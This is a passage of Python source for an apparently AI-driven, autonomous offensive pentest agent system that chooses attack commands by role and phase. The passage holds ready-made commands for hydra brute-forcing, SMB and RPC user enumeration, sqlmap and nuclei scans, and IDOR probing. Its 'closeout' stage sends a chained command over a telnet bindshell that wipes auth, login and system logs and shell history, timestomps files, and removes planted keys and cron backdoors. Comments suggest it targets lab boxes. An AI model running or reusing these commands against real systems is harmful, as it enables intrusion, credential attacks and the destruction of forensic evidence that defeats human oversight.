                    (f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst -t 4 ssh://{ctx.target}", "hydra_ssh", "⚔️ SSH brute"),
                    (f"hydra -l root -P /usr/share/nmap/nselib/data/passwords.lst -t 4 ftp://{ctx.target}", "hydra_ftp", "⚔️ FTP brute"),
                    (f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst http-get://{ctx.target}", "hydra_http", "⚔️ HTTP brute"),
                    (f"hydra -l sa -P /usr/share/nmap/nselib/data/passwords.lst mssql://{ctx.target}", "hydra_mssql", "⚔️ MSSQL brute"),
                    # SMB/Network attacks
                    (f"crackmapexec smb {ctx.target} --shares", "cme_shares", "⚔️ SMB share enum"),
                    (f"crackmapexec smb {ctx.target} --users", "cme_users", "⚔️ SMB users"),
                    (f"crackmapexec smb {ctx.target} --pass-pol", "cme_passpol", "⚔️ SMB password policy"),
                    (f"crackmapexec smb {ctx.target} --groups", "cme_groups", "⚔️ SMB groups"),
                    # SQL injection (different endpoints)
                    (f"sqlmap -u 'http://{ctx.target}/?id=1' --batch", "sqlmap_id", "⚔️ SQL injection test"),
                    (f"sqlmap -u 'http://{ctx.target}/login.php' --forms --batch", "sqlmap_forms", "⚔️ SQLi form test"),
                    (f"sqlmap -u 'http://{ctx.target}/search?q=1' --batch", "sqlmap_search", "⚔️ SQLi search test"),
                    # Vuln scanning (different templates)
                    (f"nuclei -u http://{ctx.target} -as -severity critical", "nuclei_cve", "⚔️ CVE auto-scan"),
                    (f"nuclei -u http://{ctx.target} -as -severity high,critical", "nuclei_vuln", "⚔️ Vuln scan"),
                    (f"nuclei -u http://{ctx.target} -as -tags panel", "nuclei_panels", "⚔️ Exposed panels"),
                    (f"nuclei -u http://{ctx.target} -as -tags misconfig", "nuclei_misconfig", "⚔️ Misconfigs"),
                    # CMS specific
                    (f"wpscan --url http://{ctx.target} --enumerate u", "wpscan_users", "⚔️ WP user enum"),
                    (f"wpscan --url http://{ctx.target} --enumerate vp", "wpscan_plugins", "⚔️ WP vuln plugins"),
                    (f"wpscan --url http://{ctx.target} --enumerate t", "wpscan_themes", "⚔️ WP themes"),
                ]
                # Filter by signature (not just prefix)
                # Batch 12: Also filter out HTTP commands when no HTTP service, and unavailable tools
                _has_http = ctx.state_flags.get("http_service_found", False)
                _ut = getattr(self, '_unavailable_tools', set())
                def _fallback_ok(cmd):
                    binary = cmd.split()[0].split("/")[-1]
                    if binary in _ut:
                        return False
                    if not _has_http and ("http://" in cmd or "https://" in cmd):
                        return False
                    return True
                untried = [(c, sig, r) for c, sig, r in red_fallbacks 
                           if sig not in tried_signatures and c not in tried_commands and _fallback_ok(c)]
                if untried:
                    cmd, _, reason = random.choice(untried)
                else:
                    # Rotation with step-based variety
                    diverse_red = [
                        (f"searchsploit kernel {3 + step % 5}", "⚔️ Kernel search var"),
                        (f"nikto -h http://{ctx.target}:{80 + step*10}", "⚔️ Nikto alt port"),
                        (f"nuclei -u http://{ctx.target} -severity high", "⚔️ Nuclei high sev"),
                        (f"wfuzz -c -z file,/usr/share/dirb/wordlists/common.txt http://{ctx.target}/FUZZ", "⚔️ Wfuzz"),
                    ]
                    cmd, reason = diverse_red[step % len(diverse_red)]
                    logger.warning(f"[{self.agent_name}] Red fallbacks exhausted - rotating")
                return SmartDecisionResult(
                    command=cmd,
                    template_name="red_offensive",
                    params={},
                    mentor_call=False,
                    mentor_reasoning=reason,
                    confidence=0.5,
                    phase=AttackPhase.EXPLOITATION,
                )
            elif role_name == "stealth":
                # Shadow agent quiet fallbacks - EXTENSIVE list with SIGNATURES
                stealth_fallbacks = [
                    # HTTP/Web (quiet) - unique signatures
                    (f"curl -s -I http://{ctx.target} | head -20", "curl_-i", "👤 HTTP headers"),
                    (f"curl -s http://{ctx.target}/robots.txt", "curl_robots", "👤 Robots.txt"),
                    (f"curl -s http://{ctx.target}/sitemap.xml | head -50", "curl_sitemap", "👤 Sitemap"),
                    (f"curl -sL http://{ctx.target}/.well-known/security.txt", "curl_security", "👤 Security.txt"),
                    (f"curl -s http://{ctx.target}/.git/config 2>/dev/null", "curl_git", "👤 Git config leak"),
                    (f"wget -q --spider http://{ctx.target}", "wget_spider", "👤 Web check"),
                    (f"wget -q -O- http://{ctx.target}/ | head -100", "wget_page", "👤 Page preview"),
                    # DNS (passive) - unique queries
                    (f"dig {ctx.target} ANY +noall +answer", "dig_any", "👤 DNS query"),
                    (f"dig {ctx.target} TXT +short", "dig_txt", "👤 DNS TXT records"),
                    (f"dig {ctx.target} MX +short", "dig_mx", "👤 DNS MX"),
                    (f"dig {ctx.target} AXFR +noall +answer 2>/dev/null | head -20", "dig_axfr", "👤 Zone transfer"),
                    # Network probes (quiet) - different ports
                    (f"nc -zv {ctx.target} 22 2>&1 | head -1", "nc_22", "👤 SSH probe"),
                    (f"nc -zv {ctx.target} 80 2>&1 | head -1", "nc_80", "👤 HTTP probe"),
                    (f"nc -zv {ctx.target} 443 2>&1 | head -1", "nc_443", "👤 HTTPS probe"),
                    (f"nc -zv {ctx.target} 21 2>&1 | head -1", "nc_21", "👤 FTP probe"),
                    (f"nc -zv {ctx.target} 3389 2>&1 | head -1", "nc_3389", "👤 RDP probe"),
                    (f"nc -zv {ctx.target} 445 2>&1 | head -1", "nc_445", "👤 SMB probe"),
                    # SMB/Windows (quiet) - unique operations
                    (f"smbclient -L //{ctx.target} -N 2>/dev/null | head -20", "smbclient_-l", "👤 SMB shares"),
                    (f"smbclient //{ctx.target}/C$ -N -c 'ls' 2>/dev/null | head -10", "smbclient_c$", "👤 SMB C$ check"),
                    (f"smbclient //{ctx.target}/IPC$ -N -c 'ls' 2>/dev/null | head -10", "smbclient_ipc", "👤 SMB IPC$ check"),
                    # User enumeration (quiet) - unique flags
                    (f"enum4linux -U {ctx.target} 2>/dev/null", "enum4linux_-u", "👤 User enum"),
                    (f"enum4linux -S {ctx.target} 2>/dev/null", "enum4linux_-s", "👤 Share enum"),
                    (f"enum4linux -P {ctx.target} 2>/dev/null", "enum4linux_-p", "👤 Password policy"),
                    (f"enum4linux -G {ctx.target} 2>/dev/null", "enum4linux_-g", "👤 Group enum"),
                    (f"rpcclient -U '' -N {ctx.target} -c 'enumdomusers' 2>/dev/null", "rpcclient_users", "👤 RPC user enum"),
                    (f"rpcclient -U '' -N {ctx.target} -c 'querydominfo' 2>/dev/null", "rpcclient_domain", "👤 RPC domain info"),
                    (f"rpcclient -U '' -N {ctx.target} -c 'enumdomgroups' 2>/dev/null", "rpcclient_groups", "👤 RPC groups"),
                    # LDAP/AD
                    (f"ldapsearch -x -h {ctx.target} -b '' -s base 2>/dev/null | head -30", "ldapsearch_base", "👤 LDAP base"),
                    # SNMP
                    (f"snmpwalk -v2c -c public {ctx.target} 2>/dev/null | head -30", "snmpwalk_public", "👤 SNMP walk"),
                    # SSH banner
                    (f"ssh -o BatchMode=yes -o ConnectTimeout=3 {ctx.target} 2>&1 | head -5", "ssh_banner", "👤 SSH banner"),
                ]
                # Filter by signature (not just prefix)
                untried = [(c, sig, r) for c, sig, r in stealth_fallbacks 
                           if sig not in tried_signatures and c not in tried_commands]
                if untried:
                    cmd, _, reason = random.choice(untried)
                else:
                    # Rotation with step-based variety
                    diverse_stealth = [
                        (f"curl -s http://{ctx.target}/api/v{step % 5}", "👤 API probe"),
                        (f"nc -zv {ctx.target} {100 + step*50} 2>&1", "👤 Port probe"),
                        (f"dig {ctx.target} CNAME +short", "👤 DNS CNAME"),
                        (f"wget -q -O- http://{ctx.target}/page{step}", "👤 Page probe"),
                    ]
                    cmd, reason = diverse_stealth[step % len(diverse_stealth)]
                    logger.warning(f"[{self.agent_name}] Stealth fallbacks exhausted - rotating")
                return SmartDecisionResult(
                    command=cmd,
                    template_name="curl_headers",
                    params={"target": ctx.target},
                    mentor_call=False,
                    mentor_reasoning=reason,
                    confidence=0.4,
                    phase=AttackPhase.ENUMERATION,
                )
            else:
                # Generic fallback - use step-based variety to avoid loops
                generic_fallbacks = [
                    f"ping -c 2 {ctx.target}",
                    f"host {ctx.target}",
                    f"dig {ctx.target} A +short",
                    f"nslookup {ctx.target}",
                    f"traceroute -n {ctx.target} 2>/dev/null | head -5",
                    f"curl -sI http://{ctx.target} | head -5",
                    f"nc -zv {ctx.target} 80 2>&1",
                ]
                cmd = generic_fallbacks[step % len(generic_fallbacks)]
                return SmartDecisionResult(
                    command=cmd,
                    template_name="nmap_quick",
                    params={"target": ctx.target},
                    mentor_call=False,
                    confidence=0.3,
                    phase=AttackPhase.RECON,
                )
        
        # Check learned commands for suggestions (filtered by role)
        learned_suggestions = self.learned_store.get_successful_commands(
            phase=ctx.current_phase,
            min_success_rate=0.5,
            limit=5
        )
        
        # Filter learned suggestions by role AND recent history (avoid repetition)
        recent_templates = set()
        if self.decisions:
            recent_templates = {d.template_name for d in self.decisions[-3:]}
        
        role_learned = [s for s in learned_suggestions 
                        if s.template_name in [c.name for c in filtered_commands]
                        and s.template_name not in recent_templates]
        
        # Only use learned commands 30% of the time (prefer exploration)
        if role_learned and random.random() < 0.3:
            # Pick randomly from top 3 learned commands (not just the best)
            top_learned = role_learned[:min(3, len(role_learned))]
            best = random.choice(top_learned)
            template = COMMAND_REGISTRY.get(best.template_name)
            if template:
                try:
                    params = dict(best.params)
                    if "target" in template.required_params:
                        params["target"] = ctx.target
                    if "url" in template.required_params and "url" not in params:
                        params["url"] = f"http://{ctx.target}"
                    
                    command = render_command(template, params)
                    self.step_used_commands.add(template.name)
                    
                    return SmartDecisionResult(
                        command=command,
                        template_name=best.template_name,
                        params=params,
                        mentor_call=False,
                        mentor_reasoning=f"{self._role_emoji()} Proven: {template.description[:40]} (success: {best.success_rate:.0%})",
                        confidence=min(0.9, best.success_rate + 0.2),
                        phase=template.phase,
                    )
                except ValueError:
                    pass
        
        # =====================================================================
        # FALLBACK: RANDOMIZED SELECTION FROM TOP CANDIDATES
        # (PPO already tried earlier in _decide_from_registry, before fallbacks)
        # =====================================================================
        
        # Penalize recently used commands (agent's own history - last 10 decisions)
        recent_templates = set()
        if self.decisions:
            # Weight more recent commands higher (avoid last 3 strongly, next 7 moderately)
            strongly_avoid = {d.template_name for d in self.decisions[-3:]}
            moderately_avoid = {d.template_name for d in self.decisions[-10:-3]} if len(self.decisions) > 3 else set()
            recent_templates = strongly_avoid | moderately_avoid
        
        # Also avoid commands used too many times in this episode
        heavily_used = {name for name, count in self.command_repeat_count.items() if count >= 3}
        
        # Filter out recently used and heavily repeated, prioritize novel commands
        novel_commands = [c for c in filtered_commands 
                         if c.name not in recent_templates 
                         and c.name not in heavily_used
                         and c.name not in self.episode_used_commands]
        
        if novel_commands:
            filtered_commands = novel_commands
        else:
            # Second pass: allow episode-used but avoid recent and heavily_used
            less_recent = [c for c in filtered_commands 
                          if c.name not in strongly_avoid 
                          and c.name not in heavily_used]
            if less_recent:
                filtered_commands = less_recent
            else:
                # Last resort: avoid only the last 3
                last_resort = [c for c in filtered_commands if c.name not in strongly_avoid]
                if last_resort:
                    filtered_commands = last_resort
        
        # Shuffle first to break any deterministic ordering
        random.shuffle(filtered_commands)
        
        # Sort by reward but pick randomly from top 5
        filtered_commands.sort(key=lambda c: c.typical_reward, reverse=True)
        top_n = min(5, len(filtered_commands))
        
        # More uniform weights to encourage variety (less reward bias)
        weights = [1.0 + (c.typical_reward * 0.2) for c in filtered_commands[:top_n]]
        template = random.choices(filtered_commands[:top_n], weights=weights, k=1)[0]
        
        # Mark as used for this step AND episode
        self.step_used_commands.add(template.name)
        self.episode_used_commands.add(template.name)
        self.command_repeat_count[template.name] = self.command_repeat_count.get(template.name, 0) + 1
        
        # Try to fill required params
        params = {}
        for p in template.required_params:
            if p == "target":
                params[p] = ctx.target
            elif p == "url":
                params[p] = f"http://{ctx.target}"
            elif p == "ports" and "open_ports" in ctx.discoveries:
                params[p] = ",".join(str(port) for port in ctx.discoveries["open_ports"][:10])
            elif p in template.optional_params:
                params[p] = template.optional_params[p]
        
        # Add optional params
        params.update(template.optional_params)
        
        try:
            command = render_command(template, params)
        except ValueError as e:
            # Missing required param - use step-based variety
            step = getattr(self, '_current_step', 0)
            fallbacks = [
                f"masscan -p1-1000 {ctx.target}",
                f"dig {ctx.target} ANY +short",
                f"whatweb http://{ctx.target}",
                f"curl -sI http://{ctx.target}",
                f"host {ctx.target}",
            ]
            command = fallbacks[step % len(fallbacks)]
            template = COMMAND_REGISTRY.get("nmap_top_ports", list(COMMAND_REGISTRY.values())[0])
            params = {"target": ctx.target, "num_ports": "100"}
        
        return SmartDecisionResult(
            command=command,
            template_name=template.name,
            params=params,
            mentor_call=False,
            mentor_reasoning=f"{self._role_emoji()} {template.description[:50]}",
            confidence=0.6,
            phase=template.phase,
        )
    
    def _role_emoji(self) -> str:
        """Get emoji for agent role."""
        emojis = {
            "recon": "🔍",
            "offensive": "⚔️",
            "defensive": "🛡️",
            "strategic": "🎯",
            "stealth": "👤",
        }
        return emojis.get(str(self.agent_role.get("role", "")), "🤖")
    
    def clear_step_commands(self):
        """Clear used commands at start of new step (called by orchestrator)."""
        self.step_used_commands.clear()

    # =====================================================================
    # PHASE 4: PLAYBOOK-GUIDED COMMAND SELECTION
    # =====================================================================

    # =====================================================================
    # PHASE 5.2+: SKILL LIBRARY INTEGRATION
    # =====================================================================

    # =========================================================================
    # PHASE 6.9: CLOSEOUT-ONLY COMMAND SELECTION
    # When phase is CLOSEOUT, we skip the entire normal pipeline.
    # Only closeout commands are valid. Simple round-robin through the ledger.
    # =========================================================================
    CLOSEOUT_COMMAND_NAMES = [
        "remove_uploaded_tools",
        "remove_ssh_keys_planted",
        "remove_cron_backdoors",
        "cleanup_tmp_artifacts",
        "verify_target_stable",
        "clear_bash_history",
        "clear_auth_logs",
        "clear_wtmp_btmp",
        "shred_sensitive_files",
        "timestomp_closeout",
        "clear_syslog",
        "remove_known_hosts",
        "generate_report",
    ]

    # Phase 6.9.4: Pre-defined ops for single-step batch CLOSEOUT execution
    _CLOSEOUT_BATCH_OPS = {
        "remove_uploaded_tools":
            "find /tmp /dev/shm /var/tmp -name 'ariaska_*' -o -name 'payload_*' -delete 2>/dev/null; echo CLOSEOUT_TOOLS_REMOVED",
        "remove_ssh_keys_planted":
            "sed -i '/attacker/d' /root/.ssh/authorized_keys 2>/dev/null; echo CLOSEOUT_KEYS_REMOVED",
        "remove_cron_backdoors":
            "crontab -r 2>/dev/null; find /etc/cron* -name 'ariaska*' -delete 2>/dev/null; echo CLOSEOUT_CRON_REMOVED",
        "cleanup_tmp_artifacts":
            "rm -f /tmp/ariaska_* /tmp/payload_* /tmp/loot_* 2>/dev/null; echo CLOSEOUT_TMP_CLEANED",
        "verify_target_stable":
            "uptime && ps aux | wc -l && echo TARGET_STABLE_VERIFIED",
        "clear_bash_history":
            "cat /dev/null > ~/.bash_history 2>/dev/null; echo CLOSEOUT_HISTORY_CLEARED",
        "clear_auth_logs":
            "cat /dev/null > /var/log/auth.log 2>/dev/null; echo CLOSEOUT_AUTH_CLEARED",
        "clear_wtmp_btmp":
            "cat /dev/null > /var/log/wtmp 2>/dev/null; cat /dev/null > /var/log/btmp 2>/dev/null; echo CLOSEOUT_LOGIN_LOGS_CLEARED",
        "shred_sensitive_files":
            "rm -f /tmp/loot* /tmp/exfil* 2>/dev/null; echo CLOSEOUT_FILES_SHREDDED",
        "timestomp_closeout":
            "find /tmp /var/tmp /dev/shm -newer /etc/hostname -exec touch -r /etc/hostname {} \\; 2>/dev/null; echo CLOSEOUT_TIMESTAMPS_FIXED",
        "clear_syslog":
            "cat /dev/null > /var/log/syslog 2>/dev/null; echo CLOSEOUT_SYSLOG_CLEARED",
        "remove_known_hosts":
            "rm -f ~/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null; echo CLOSEOUT_KNOWN_HOSTS_REMOVED",
        "generate_report":
            "echo === ARIASKA ENGAGEMENT REPORT === Target cleaned. All artifacts removed. REPORT_GENERATED",
    }

    # =====================================================================
    # PHASE 23: SMART PHASE LADDER — DISCOVERY-DRIVEN, NOT STEP-COUNTED
    # =====================================================================
    # Instead of hardcoded step minimums, phase advancement is gated by
    # what the agents have actually discovered. The GPT parser drives
    # discoveries into the discovery board, and the phase ladder checks
    # whether enough evidence exists to advance. This is self-learning:
    # as GPT teaches patterns and agents improve, they find things faster
    # and advance phases naturally.
    
    PHASE_READINESS_CRITERIA = {
        "RECON": {
            "description": "Need ports and at least one service identified",
            "check": lambda board: (
                len(board.get("ports", set())) >= 2
                and len(board.get("services", set())) >= 1
            ),
        },
        "ENUMERATION": {
            "description": "Need detailed service info or web paths discovered",
            "check": lambda board: (
                len(board.get("services", set())) >= 2
                or len(board.get("web_paths", set())) >= 1
                or len(board.get("vulns", set())) >= 1
            ),
        },
        "EXPLOITATION": {
            "description": "Need credentials, vulnerabilities, or shells",
            "check": lambda board: (
                len(board.get("credentials", set())) >= 1
                or len(board.get("vulns", set())) >= 1
                or len(board.get("shells", set())) >= 1
            ),
        },
        "PRIVILEGE_ESCALATION": {
            "description": "Need an active shell or confirmed credential access",
            "check": lambda board: (
                len(board.get("shells", set())) >= 1
                or len(board.get("credentials", set())) >= 1
            ),
        },
        # Later phases advance freely once we have shells/access
        "LATERAL_MOVEMENT": {"description": "Shell access sufficient", "check": lambda board: True},
        "POST_EXPLOITATION": {"description": "Shell access sufficient", "check": lambda board: True},
        "EXFILTRATION": {"description": "Shell access sufficient", "check": lambda board: True},
        "CLOSEOUT": {"description": "Always allowed", "check": lambda board: True},
    }

    def _phase_ladder_gate(self, step_ctx: "SmartStepContext") -> str:
        """
        Phase 23: Smart phase ladder enforcement using discovery board.
        
        Instead of counting steps, checks whether the discovery board has
        enough evidence to justify being in the current phase. If not,
        clamps back to the appropriate phase.
        
        The GPT parser drives discoveries → discovery board gates phases.
        As agents learn better patterns, they advance faster naturally.

        Returns:
            Teaching point string, or empty string if no gate triggered.
        """
        from core.feature_flags import get_feature_flags
        ff = get_feature_flags()
        if not ff.strict_phase_ladder:
            return ""

        ctx = step_ctx.attack_context
        if not ctx or not ctx.current_phase:
            return ""

        phase_name = ctx.current_phase.name
        
        # Get the discovery board from step context
        # P35 Fix: discovery_board is nested inside step_ctx.state["discovery_board"],
        # NOT a direct attribute of step_ctx. getattr() was returning None always,
        # causing the gate to run against empty {} and always fail.
        discovery_board = None
        if hasattr(step_ctx, 'state') and isinstance(step_ctx.state, dict):
            discovery_board = step_ctx.state.get('discovery_board', None)
        if discovery_board is None:
            discovery_board = getattr(step_ctx, 'discovery_board', {})

        # Check if ALL prerequisite phases have sufficient discoveries
        from core.commands.command_registry import AttackPhase
        PHASE_ORDER = [
            "RECON", "ENUMERATION", "EXPLOITATION", "PRIVILEGE_ESCALATION",
            "LATERAL_MOVEMENT", "POST_EXPLOITATION", "EXFILTRATION", "CLOSEOUT",
        ]
        current_idx = PHASE_ORDER.index(phase_name) if phase_name in PHASE_ORDER else 0
        
        # Check earlier phases for readiness
        for earlier_phase in PHASE_ORDER[:current_idx]:
            criteria = self.PHASE_READINESS_CRITERIA.get(earlier_phase, {})
            check_fn = criteria.get("check", lambda b: True)
            description = criteria.get("description", "")
            
            if not check_fn(discovery_board):
                # Not ready — clamp back to the unfinished phase
                try:
                    clamped = AttackPhase[earlier_phase]
                    ctx.current_phase = clamped
                    teaching = (
                        f"SMART LADDER: {phase_name} → {earlier_phase} "
                        f"(reason: {description})"
                    )
                    return teaching
                except (KeyError, ValueError):
                    pass
        
        # Check current phase readiness too — advisory teaching
        criteria = self.PHASE_READINESS_CRITERIA.get(phase_name, {})
        check_fn = criteria.get("check", lambda b: True)
        if not check_fn(discovery_board):
            description = criteria.get("description", "")
            return (
                f"Phase {phase_name}: not yet ready to advance. "
                f"Need: {description}"
            )

        return ""

    def _decide_closeout_only(
        self,
        step_ctx: "SmartStepContext",
    ) -> "SmartDecisionResult":
        """Batch ALL remaining closeout commands into a single step.

        Phase 6.9.4: Instead of executing 13 commands over 13 steps,
        chains all remaining cleanup operations into one mega-command
        delivered through a single telnet session.  Cuts CLOSEOUT from
        ~13 steps to 1 step per episode.

        Args:
            step_ctx: Current step context.

        Returns:
            SmartDecisionResult with a batched closeout command.
        """
        ctx = step_ctx.attack_context
        target = ctx.target if ctx else "172.28.0.10"

        # Phase 6.9.1: Use instance-level tracking (template names, not rendered strings)
        if not hasattr(self, '_closeout_used_templates'):
            self._closeout_used_templates = set()

        # Find the first closeout command NOT yet used
        remaining = [n for n in self.CLOSEOUT_COMMAND_NAMES if n not in self._closeout_used_templates]

        # All done → just verify target stability
        if not remaining:
            command = f'{{ echo "uptime && ps aux | wc -l && echo TARGET_STABLE_VERIFIED"; sleep 2; }} | timeout 10 telnet {target} 1524'
            return SmartDecisionResult(
                command=command,
                template_name="verify_target_stable",
                params={"target": target},
                mentor_call=False,
                phase=AttackPhase.CLOSEOUT,
                confidence=0.95,
                source="closeout_gate",
                mentor_reasoning="[CLOSEOUT] All tasks done, verifying target stability",
            )

        # BATCH MODE: chain ALL remaining ops into a single telnet session
        ops = []
        for name in remaining:
            op = self._CLOSEOUT_BATCH_OPS.get(name)
            if op:
                ops.append(op)

        combined = "; ".join(ops) + "; echo CLOSEOUT_ALL_COMPLETE"

        # Single telnet session with extended timeout for the full batch
        command = f'{{ echo "{combined}"; sleep 5; }} | timeout 60 telnet {target} 1524'

        # Mark ALL as used in one shot
        self._closeout_used_templates.update(remaining)

        logger.info(
            f"[CLOSEOUT][{self.agent_name}] Phase=CLOSEOUT → BATCH "
            f"all {len(remaining)} cleanup commands in single step"
        )

        return SmartDecisionResult(
            command=command,
            template_name="closeout_batch",
            params={"target": target},
            mentor_call=False,
            phase=AttackPhase.CLOSEOUT,
            confidence=0.99,
            source="closeout_gate",
            mentor_reasoning=f"[CLOSEOUT BATCH] {len(remaining)} ops: {', '.join(remaining[:5])}{'...' if len(remaining) > 5 else ''}",
        )

    @property
    def closeout_complete(self) -> bool:
        """Returns True when all 13 closeout commands have been executed."""
        if not hasattr(self, '_closeout_used_templates'):
            return False
        return len(self._closeout_used_templates) >= len(self.CLOSEOUT_COMMAND_NAMES)

    def _query_skill_library(
        self,
        step_ctx: "SmartStepContext",
    ) -> Optional["SmartDecisionResult"]:
        """Query skill library for a high-confidence match.

        Checks learned skills (from postmortem analysis) for the current
        phase and state. Only returns a result if confidence ≥ 0.75.

        Args:
            step_ctx: Current step context.

        Returns:
            SmartDecisionResult if a matching skill is found, else None.
        """
        if not self.skill_library:
            return None

        try:
            ctx = step_ctx.attack_context
            phase_name = ctx.current_phase.name.lower() if ctx.current_phase else "recon"

            # Build keywords from current state
            keywords = [phase_name]
            for flag, active in ctx.state_flags.items():
                if active:
                    keywords.append(flag.replace("_", " "))

            # Add discovery context
            for disc_type, values in ctx.discoveries.items():
                if values:
                    keywords.append(disc_type)

            skills = self.skill_library.get_skills_for_condition(keywords)
            if not skills:
                return None

            # Take best skill with confidence ≥ 0.75
            best = skills[0]
            if best.confidence < 0.75:
                return None

            # Try to match skill's action to a registry command
            action_lower = best.then_action.lower()
            for template in COMMAND_REGISTRY.values():
                if template.name.lower() in action_lower or action_lower.startswith(template.template.split()[0].lower()):
                    # Validate role
                    if self.action_mapper and self.action_mapper.command_to_action(template.name) < 0:
                        continue  # Not in this role's pool

                    params = {}
                    for p in template.required_params:
                        params[p] = self._get_default_param(p, ctx)
                    params.update(template.optional_params)

                    try:
                        command = render_command(template, params)
                    except ValueError:
                        continue

                    logger.debug(
                        f"[SKILL][{self.agent_name}] Skill '{best.id}' "
                        f"(conf={best.confidence:.2f}) → {template.name}"
                    )

                    # Phase 12.1: Record usage for conformity decay
                    self.skill_library.record_usage(best.id)

                    return SmartDecisionResult(
                        command=command,
                        template_name=template.name,
                        params=params,
                        mentor_call=False,
                        mentor_reasoning=f"🎓 Skill[{best.id}] → {best.then_action[:40]}",
                        confidence=best.confidence,
                        phase=template.phase,
                        source="skill_library",
                    )

        except Exception as e:
            logger.debug(f"Skill library query failed: {e}")

        return None

    def _web_path_followup(
        self,
        step_ctx: "SmartStepContext",
        discovery_board: Dict[str, Any],
    ) -> Optional["SmartDecisionResult"]:
        """Inject follow-up commands for discovered web paths.
        
        When ffuf/gobuster/feroxbuster discovers web paths (e.g. /data),
        this method generates curl commands to explore those paths and
        check for IDOR patterns (e.g. /data/0, /data/1).
        
        Only fires for ScoutAgent and RedAgent roles. Tracks which
        paths have been followed up to avoid repeats.
        """
        # agent_role is a dict like {"role": "offensive", ...} — extract the role string
        _role_str = self.agent_role.get("role", "") if isinstance(self.agent_role, dict) else self.agent_role
        if _role_str not in ("recon", "offensive"):
            return None
        
        web_paths = discovery_board.get("web_paths", set())
        services = discovery_board.get("services", set())
        target = discovery_board.get("target", getattr(step_ctx.attack_context, "target", ""))
        if not target:
            return None

        # ── P51: Homepage + common-paths probes when HTTP found ──────────
        # These probes fire ONCE per engagement regardless of existing
        # web_paths.  Previous P50 logic gated on `not web_paths`, but
        # early ffuf/gobuster runs populate web_paths with noise (/_/,
        # /___/, /sec), preventing the probes from running.
        # Critical: Cap's /data/N IDOR path is only discoverable from
        # homepage links or common-path probe — NOT from directory brute-force.
        if "http" in services or "https" in services:
            if not hasattr(self, '_initial_web_probe_done'):
                self._initial_web_probe_done = False
            if not hasattr(self, '_common_paths_probed'):
                self._common_paths_probed = False
            ctx = step_ctx.attack_context
            current_phase = ctx.current_phase if ctx else None

            if not self._initial_web_probe_done:
                self._initial_web_probe_done = True
                cmd = (
                    f"curl -sL http://{target}/ | head -200; "
                    f"echo '---HREFS---'; "
                    f"curl -sL http://{target}/ | grep -oiE 'href=\"[^\"]+\"' | sort -u"
                )
                self._step_reasoning_log.append({
                    "event": "web_followup_homepage",
                    "detail": "Initial homepage probe + link extraction",
                })
                return SmartDecisionResult(
                    command=cmd,
                    source="web_followup",
                    confidence=0.90,
                    template_name="curl_homepage",
                    params={"target": target},
                    reasoning="[WEB_FOLLOWUP] Homepage probe + link extraction (HTTP found, no web paths yet)",
                    phase=current_phase,  # type: ignore[arg-type]
                    mentor_call=False,
                )

            if not self._common_paths_probed:
                self._common_paths_probed = True
                # P51: Also probe FTP (port 21) which PPO often misses
                # in initial nmap. Cap and many HTB boxes have FTP.
                _ports = discovery_board.get("ports", set())
                _ftp_probe = ""
                if 21 not in _ports and "21" not in {str(p) for p in _ports}:
                    _ftp_probe = f"nmap -sV -p 21 {target}; echo '---FTP_PROBE_DONE---'; "
                cmd = (
                    f"{_ftp_probe}"
                    f"for p in data data/0 data/1 download download/0 capture files api admin dashboard; do "
                    f"code=$(curl -sL -o /dev/null -w '%{{http_code}}' http://{target}/$p/); "
                    f"echo \"/$p/ → $code\"; done"
                )
                self._step_reasoning_log.append({
                    "event": "web_followup_common_paths",
                    "detail": "Probing common CTF/pentest paths",
                })
                return SmartDecisionResult(
                    command=cmd,
                    source="web_followup",
                    confidence=0.85,
                    template_name="curl_common_paths",
                    params={"target": target},
                    reasoning="[WEB_FOLLOWUP] Probing common paths (/data, /download, /capture, etc.)",
                    phase=current_phase,  # type: ignore[arg-type]
                    mentor_call=False,
                )

            # Both probes done — fall through to main web_followup logic

        if not web_paths:
            logger.debug(
                f"[WEB_FOLLOWUP][{self.agent_name}] No web_paths in board. "
                f"keys={list(discovery_board.keys())} wp={discovery_board.get('web_paths', 'MISSING')}"
            )
            return None
        
        # Track which paths have been followed up
        if not hasattr(self, '_explored_web_paths'):
            self._explored_web_paths = set()
        if not hasattr(self, '_explored_web_path_ids'):
            self._explored_web_path_ids = set()
        if not hasattr(self, '_explored_web_path_html'):
            self._explored_web_path_html = set()
        if not hasattr(self, '_explored_web_path_downloads'):
            self._explored_web_path_downloads = set()
        
        ctx = step_ctx.attack_context
        current_phase = ctx.current_phase if ctx else None
        
        # Find unexplored paths
        for path in sorted(web_paths):
            path_clean = str(path).strip("/")
            if not path_clean or path_clean in (".", "..", "index.html", "index.php"):
                continue
            
            # First: explore the path itself
            if path_clean not in self._explored_web_paths:
                self._explored_web_paths.add(path_clean)
                cmd = f"curl -sL http://{target}/{path_clean} | head -200"
                self._step_reasoning_log.append({
                    "event": "web_followup",
                    "detail": f"Following up on discovered path /{path_clean}",
                })
                return SmartDecisionResult(
                    command=cmd,
                    source="web_followup",
                    confidence=0.85,
                    template_name="curl_web_path",
                    params={"target": target, "path": path_clean},
                    reasoning=f"[WEB_FOLLOWUP] Exploring discovered path /{path_clean}",
                    phase=current_phase,  # type: ignore[arg-type]
                    mentor_call=False,
                )
            
            # Second: try IDOR enumeration on the path
            if path_clean not in self._explored_web_path_ids:
                self._explored_web_path_ids.add(path_clean)
                cmd = (
                    f"for i in $(seq 0 5); do echo \"=== /{path_clean}/$i ===\"; "
                    f"curl -sL http://{target}/{path_clean}/$i -o /dev/null "
                    f"-w 'Status: %{{http_code}} Size: %{{size_download}}\\n'; done"
                )
                self._step_reasoning_log.append({
                    "event": "web_followup_ids",
                    "detail": f"IDOR enumeration on /{path_clean}/0-5",
                })
                return SmartDecisionResult(
                    command=cmd,
                    source="web_followup",
                    confidence=0.80,
                    template_name="curl_web_path_ids",
                    params={"target": target, "path": path_clean},
                    reasoning=f"[WEB_FOLLOWUP] IDOR enumeration /{path_clean}/0-5",
                    phase=current_phase,  # type: ignore[arg-type]
                    mentor_call=False,
                )

            # Third: extract links from IDOR-successful pages (find download URLs)
            if path_clean not in self._explored_web_path_html:
                self._explored_web_path_html.add(path_clean)
                logger.debug(
                    f"[WEB_FOLLOWUP][{self.agent_name}] Phase3: extracting links from /{path_clean}/0"
                )
                cmd = (
                    f"curl -sL http://{target}/{path_clean}/0 | "
                    f"grep -oiE 'href=\"[^\"]*\"' | sort -u | head -20"
                )
                self._step_reasoning_log.append({
                    "event": "web_followup_links",
